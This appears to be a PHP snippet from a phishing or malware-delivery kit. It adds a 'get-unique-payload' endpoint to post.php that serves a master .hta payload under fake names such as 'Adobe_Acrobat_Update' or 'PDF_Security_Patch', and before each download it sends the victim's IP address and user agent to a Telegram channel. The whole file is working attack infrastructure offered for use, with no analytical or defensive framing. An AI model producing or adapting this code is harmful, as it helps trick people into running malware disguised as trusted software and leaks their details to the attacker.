// UNIQUE PAYLOAD ENDPOINT - ADD THIS AT TOP OF post.php
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['route']) && $_GET['route'] === 'get-unique-payload') {
    
    // 1. Generate Unique Filename
    $themes = ['Adobe_Acrobat_Update', 'PDF_Security_Patch', 'Document_Viewer_Pro', 'Acrobat_DC_Installer'];
    $theme = $themes[array_rand($themes)];
    $uniqueId = str_pad(mt_rand(0, 999999), 6, '0', STR_PAD_LEFT);
    $filename = $theme . '_' . $uniqueId . '.hta';
    
    // 2. Define Master File Path (Relative to post.php)
    $masterPath = __DIR__ . '/payload/master.hta';
    
    // 3. Send Telegram Notification BEFORE Downloading
    $ip = getIP(); // Uses your existing helper function
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    $tgMsg = "📥 <b>NEW PAYLOAD DOWNLOADED</b>\n\n" .
             "<b>Filename:</b> <code>{$filename}</code>\n" .
             "<b>IP Address:</b> <code>{$ip}</code>\n" .
             "<b>User Agent:</b> {$ua}\n" .
             "<b>Time:</b> " . date('Y-m-d H:i:s');
             
    sendTelegram($tgMsg); // Uses your existing helper function
    
    // 4. Serve the Master File as the Unique Name
    if (file_exists($masterPath)) {
        header('Content-Type: application/hta');
        header('Content-Disposition: attachment; filename="' . $filename . '"');
        header('Content-Length: ' . filesize($masterPath));
        readfile($masterPath);
        exit;
    } else {
        http_response_code(500);
        echo json_encode(['error' => 'Master payload not found']);
        exit;
    }
}
